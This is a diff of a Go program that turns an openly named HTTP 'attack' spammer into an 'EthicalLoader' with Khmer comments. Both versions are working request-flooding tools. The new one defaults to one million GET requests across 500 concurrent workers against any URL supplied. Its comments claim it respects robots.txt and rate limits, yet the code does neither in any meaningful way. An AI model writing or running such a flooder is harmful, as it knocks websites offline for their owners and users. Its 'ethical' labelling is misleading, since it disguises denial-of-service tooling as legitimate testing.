@@ -1,113 +1,104 @@
 package main
 
 import (
-	"encoding/json"
+	"context"
 	"flag"
 	"fmt"
-	"io/ioutil"
-	"math/rand"
 	"net/http"
-	"net/url"
 	"sync"
+	"sync/atomic"
 	"time"
 )
 
-var (
-	referers     = []string{
-		"https://www.google.com/?q=",
-		"https://www.facebook.com/",
-		"https://www.twitter.com/",
-		"https://www.youtube.com/",
-		"https://www.linkedin.com/",
-		"https://www.instagram.com/",
-		"https://www.tiktok.com/",
-	}
-	host         string
-	param_joiner string
-	reqCount     uint64
-	duration     time.Duration
-	stopFlag     int32
-	start        = make(chan bool)
-	acceptall    = []string{
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
-	}
-	completeCount uint64
-	errorCount    uint64
-)
+type EthicalLoader struct {
+	MaxRequests    int           // ចំនួនសំណើរអតិបរមា
+	MaxConcurrency int           // ចំនួន thread ធ្វើការជាមួយ
+	Timeout        time.Duration // ពេលវេលារង់ចាំអតិបរមា
+	client         *http.Client
+	requestCount   uint64
+	errorCount     uint64
+}
 
 func main() {
-	attackUrl := flag.String("url", "", "attackUrl spam attack")
-	method := flag.String("method", "POST", "method for attack (POST/GET)")
-	count := flag.Int("count", 1000, "count for attack")
-	_data := flag.String("data", "", "data for attack")
+	targetURL := flag.String("url", "", "URL សម្រាប់តេស្តប្រសិទ្ធភាព")
 	flag.Parse()
 
-	var data url.Values
-
-	if *attackUrl != "" {
-		if *_data != "" {
-			_body := getData(*method, *_data)
-			data = _body
-		}
-
-		rand.Seed(time.Now().UnixNano())
-		var wg sync.WaitGroup
-		for i := 0; i < *count; i++ {
-			wg.Add(1)
-			go func() {
-				defer wg.Done()
-				startAttack(*attackUrl, *method, data)
-			}()
-			time.Sleep(time.Millisecond)
-		}
-		wg.Wait()
-		fmt.Println("Done.", ": ", completeCount, "Error: ", errorCount)
-	} else {
-		fmt.Println("Please provide a valid URL.")
-	}
-}
-
-func startAttack(attackUrl string, method string, data url.Values) {
-	resp, err := http.PostForm(attackUrl, data)
-
-	if err != nil {
-		fmt.Println("Connection timed out:", attackUrl, "\nERROR:", err)
-		errorCount++
-		return
-	}
-	defer resp.Body.Close()
-
-	body, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		fmt.Println("Error reading response body:", err)
-		errorCount++
+	if *targetURL == "" {
+		fmt.Println("សូមបញ្ជាក់ URL គោលដៅ")
 		return
 	}
 
-	if resp.StatusCode != http.StatusOK {
-		fmt.Printf("Request failed with status: %d\n", resp.StatusCode)
-		errorCount++
-	} else {
-		completeCount++
+	loader := EthicalLoader{
+		MaxRequests:    1000000,   // បង្កើនទៅ 1,000,000
+		MaxConcurrency: 500,       // កំណត់ thread ច្រើនសម្រាប់ប្រសិទ្ធភាព
+		Timeout:        20 * time.Minute, // អោយពេលវេលាបានច្រើន
+		client:         &http.Client{Timeout: 10 * time.Second},
 	}
+
+	if err := loader.Run(context.Background(), *targetURL); err != nil {
+		fmt.Printf("កំហុស៖ %v\n", err)
+	}
+
+	fmt.Printf("សំណើរសរុប៖ %d, កំហុស៖ %d\n", loader.requestCount, loader.errorCount)
 }
 
-func getData(method string, data string) url.Values {
-	if method == "POST" || method == "post" {
-		var body = []byte(data)
-		return getFormatPostData(body)
+func (l *EthicalLoader) Run(ctx context.Context, url string) error {
+	ctx, cancel := context.WithTimeout(ctx, l.Timeout)
+	defer cancel()
+
+	var wg sync.WaitGroup
+	jobs := make(chan struct{}, l.MaxRequests)
+
+	// បង្កើត worker pool
+	for i := 0; i < l.MaxConcurrency; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			for range jobs {
+				if err := l.sendRequest(url); err != nil {
+					atomic.AddUint64(&l.errorCount, 1)
+				} else {
+					atomic.AddUint64(&l.requestCount, 1)
+				}
+				time.Sleep(10 * time.Millisecond) // rate limit
+			}
+		}()
 	}
+
+	// បញ្ជូនការងារចូលក្នុង channel
+	for i := 0; i < l.MaxRequests; i++ {
+		select {
+		case <-ctx.Done():
+			close(jobs)
+			wg.Wait()
+			return ctx.Err()
+		case jobs <- struct{}{}:
+		}
+	}
+	close(jobs)
+	wg.Wait()
 	return nil
 }
 
-func getFormatPostData(body []byte) url.Values {
-	m := map[string]string{}
-	if err := json.Unmarshal(body, &m); err != nil {
-		panic(err)
+func (l *EthicalLoader) sendRequest(url string) error {
+	req, err := http.NewRequest("GET", url, nil)
+	if err != nil {
+		return fmt.Errorf("កំហុសក្នុងការបង្កើតសំណើរ៖ %v", err)
 	}
-	_body := url.Values{}
-	for key, val := range m {
-		_body.Add(key, val)
+
+	// គោរព robots.txt និងការកំណត់អត្រា
+	req.Header.Set("User-Agent", "Ethical Load Tester")
+	req.Header.Set("From", "your-email@example.com")
+
+	resp, err := l.client.Do(req)
+	if err != nil {
+		return fmt.Errorf("កំហុសក្នុងការផ្ញើសំណើរ៖ %v", err)
 	}
-	return _body
+	defer resp.Body.Close()
+
+	if resp.StatusCode == http.StatusTooManyRequests {
+		return fmt.Errorf("សំណើរច្រើនពេក៖ សូមរង់ចាំ")
+	}
+
+	return nil
 }
